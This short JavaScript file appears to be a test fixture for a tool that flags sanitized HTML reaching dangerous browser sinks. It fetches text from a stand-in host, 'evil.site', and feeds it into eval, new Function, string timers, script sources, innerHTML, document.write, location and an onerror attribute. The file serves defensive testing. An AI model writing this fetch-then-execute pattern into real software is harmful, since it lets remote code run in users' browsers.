import { sanitize } from "dompurify";

const unsafe = await (await fetch("evil.site")).text();
const value = sanitize(unsafe, { USE_PROFILES: { html: true } });

const script = document.createElement("script");
const image = document.createElement("img");
const anchor = document.createElement("a");
const input = document.createElement("input");

script.text = value;
script.textContent = value;
script.setAttribute("src", value);
script.setAttribute("text", value);
script.setAttribute("innerText", value);

image.src = value;
anchor.href = value;
input.setAttribute("value", value);
anchor.setAttribute("href", value);
anchor.setAttribute("onerror", value);
anchor.setAttribute("innerText", value);

document.body.innerHTML = value;
document.body.outerHTML = value;
document.body.insertAdjacentHTML("afterbegin", value);
document.write(value);
document.writeln(value);

document.createRange().createContextualFragment(value);

location.href = value;
location.pathname = value;
location.search = value;
location.protocol = value;
location.hostname = value;
location.assign(value);
location.replace(value);

eval(value);
setTimeout(value, 0);
setInterval(value, 0);
new Function(value);

export {};
